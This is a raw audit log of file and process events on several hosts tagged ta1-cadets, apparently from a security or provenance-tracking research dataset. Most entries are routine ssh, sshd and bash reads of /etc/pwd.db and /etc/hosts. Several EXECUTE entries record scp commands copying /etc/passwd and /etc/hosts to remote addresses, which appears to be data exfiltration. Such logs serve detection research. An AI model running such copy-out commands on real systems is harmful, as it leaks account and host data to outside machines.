1558099253.229:497649104,98A37CF0-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099243.720:497647785,92F828F6-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099243.320:497647342,92B9B0D4-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099243.310:497647335,92B9B0D4-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099234.549:497645947,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.549:497645937,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.549:497645926,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.549:497645915,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.549:497645904,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.549:497645893,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.549:497645882,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.539:497645852,8D7EE47A-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.409:497645603,8D6A9665-78A6-11E9-A28B-D4AE52C1DBD3:bash,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099234.089:497645341,8D37F295-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099234.089:497645334,8D37F295-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099233.931:497644574,8D22A051-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099233.631:497644355,8CF361A8-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099233.631:497644348,8CF361A8-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099231.210:497643722,8B83A887-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099230.851:497643187,8B4BA878-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099230.851:497643180,8B4BA878-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099230.679:497642806,8B319E23-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099230.239:497642547,8AEC4A8C-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099230.239:497642540,8AEC4A8C-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099227.570:497641809,8959661E-78A6-11E9-B129-6C2B597E484C:whoami,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099227.570:497641781,8959661E-78A6-11E9-B129-6C2B597E484C:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-3
1558099227.060:497641511,8909FB44-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099227.460:497641303,89472086-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099227.070:497641040,8909FB44-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099223.829:497640242,871C2BF4-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099223.499:497639721,86E88457-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099223.499:497639714,86E88457-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099221.739:497639310,85DBB96A-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099222.089:497638710,861234A4-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099221.739:497638141,85DBB96A-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099218.269:497630522,83CBC400-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099217.939:497629762,83982EEE-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099217.939:497629755,83982EEE-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099216.699:497628887,82D9E524-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099217.009:497628366,830CD2D1-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099216.689:497628059,82D9E524-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099213.160:497621803,80C1B2EF-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099212.860:497621619,8092DD61-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099212.860:497621612,8092DD61-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099210.149:497620217,7EF4C3C5-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099209.829:497620024,7EC28E72-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099209.829:497620017,7EC28E72-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099207.899:497618707,7D9CCD55-78A6-11E9-A28B-D4AE52C1DBD3:wget,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099207.549:497618398,7D69491A-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099207.229:497618230,7D2E73EB-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099205.520:497617787,76DA74BE-78A6-11E9-B129-6C2B597E484C:scp,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099200.009:497617031,78EB5018-78A6-11E9-A28B-D4AE52C1DBD3:cron,CONNECT,78EB599D-78A6-11E9-A28B-D4AE52C1DBD3,/var/run/logpriv,ta1-cadets-1
1558099200.011:497616897,78EBCA20-78A6-11E9-B41B-D4AE52C1DBD3:cron,CONNECT,78EBD4A2-78A6-11E9-B41B-D4AE52C1DBD3,/var/run/logpriv,ta1-cadets-2
1558099200.010:497616720,78EBA9CC-78A6-11E9-B129-6C2B597E484C:cron,CONNECT,78EBAFAE-78A6-11E9-B129-6C2B597E484C,/var/run/logpriv,ta1-cadets-3
1558099196.561:497616478,76DBA09E-78A6-11E9-B129-6C2B597E484C:ssh,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099196.561:497616468,76DBA09E-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099196.561:497616457,76DBA09E-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099196.561:497616446,76DBA09E-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099196.540:497616428,76DA74BE-78A6-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099196.540:497616319,76DA74BE-78A6-11E9-B129-6C2B597E484C:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/hosts admin@128.55.12.111:.,ta1-cadets-3
1558099196.430:497616164,708B12A1-78A6-11E9-B129-6C2B597E484C:scp,OPEN,BB0BC4FC-5600-F75D-8056-9E3E6DF7615F,/etc/passwd,ta1-cadets-3
1558099196.550:497616118,76DBA09E-78A6-11E9-B129-6C2B597E484C:ssh,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614880,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614869,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614858,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614847,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614836,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614825,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614814,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.970:497614785,708C3E99-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.960:497614649,708B12A1-78A6-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.950:497614540,708B12A1-78A6-11E9-B129-6C2B597E484C:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/passwd admin@128.55.12.111:./test/,ta1-cadets-3
1558099185.840:497614510,70790110-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099185.301:497613882,702517F1-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099185.301:497613875,702517F1-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099182.010:497613131,6DDC8C83-78A6-11E9-B129-6C2B597E484C:scp,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099181.470:497613060,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.350:497612778,6D7B4DA0-78A6-11E9-B129-6C2B597E484C:scp,OPEN,BB0BC4FC-5600-F75D-8056-9E3E6DF7615F,/etc/passwd,ta1-cadets-3
1558099181.470:497612599,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.470:497612589,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.470:497612578,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.470:497612567,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.470:497612556,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.470:497612545,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.470:497612534,6DDDBB74-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.460:497612511,6DDC8C83-78A6-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099181.450:497612402,6DDC8C83-78A6-11E9-B129-6C2B597E484C:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/hosts admin@128.55.12.117:./files/,ta1-cadets-3
1558099180.820:497611894,6D7B4DA0-78A6-11E9-B129-6C2B597E484C:scp,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.820:497611786,6D7B4DA0-78A6-11E9-B129-6C2B597E484C:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/passwd admin@128.55.12.117:./docs/,ta1-cadets-3
1558099180.411:497611522,6D3B1160-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099180.411:497611515,6D3B1160-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099180.840:497611335,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.840:497611325,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.840:497611314,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.840:497611303,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.840:497611292,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.840:497611281,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.830:497611270,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.830:497611241,6D7C7524-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099180.700:497611082,6D694B08-78A6-11E9-B129-6C2B597E484C:bash,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099176.499:497606978,6AE82562-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099176.499:497606967,6AE82562-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099176.499:497606964,6AE82562-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099176.499:497606959,6AE82562-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099176.499:497606947,6AE748A7-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099176.479:497606851,6692D9E9-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099176.809:497606749,6B15D51E-78A6-11E9-A28B-D4AE52C1DBD3:mail.local,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099176.469:497606474,6692D9E9-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099176.469:497606464,6692D9E9-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099176.469:497606445,6692D9E9-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099170.870:497601237,674B6EF7-78A6-11E9-B129-6C2B597E484C:sudo,CONNECT,678E598B-78A6-11E9-B129-6C2B597E484C,/var/run/logpriv,ta1-cadets-3
1558099169.249:497597527,6692D9E9-78A6-11E9-A28B-D4AE52C1DBD3:sendmail,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099163.940:497589713,636AB772-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099163.550:497589263,632DB163-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099163.540:497589256,632DB163-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099159.160:497585382,60912949-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099158.760:497584876,60533611-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099158.760:497584869,60533611-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099157.380:497584412,5F83066E-78A6-11E9-B129-6C2B597E484C:ls,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099157.160:497584119,5F602AFF-78A6-11E9-B129-6C2B597E484C:bash,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099156.860:497583808,5F31C57B-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099156.860:497583801,5F31C57B-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099152.380:497582766,5C86C72E-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099152.081:497582589,5C58AECF-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099152.081:497582582,5C58AECF-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099149.420:497581567,5AC312AE-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099148.990:497581199,5A80E995-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099148.990:497581192,5A80E995-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099146.540:497580305,590C4201-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099146.250:497580086,58DE41FC-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099146.250:497580079,58DE41FC-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099146.670:497579938,591E543B-78A6-11E9-B129-6C2B597E484C:ssh,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099146.670:497579928,591E543B-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099146.670:497579917,591E543B-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099146.660:497579906,591E543B-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099146.660:497579895,591E543B-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099146.660:497579884,591E543B-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099146.660:497579855,591E543B-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.720:497500664,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.720:497500653,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.720:497500642,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.720:497500631,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.720:497500620,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.720:497500609,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.720:497500598,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.711:497500568,372D029A-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099089.090:497500027,36CD0DD9-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099089.090:497500020,36CD0DD9-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099089.470:497499793,37086C2C-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
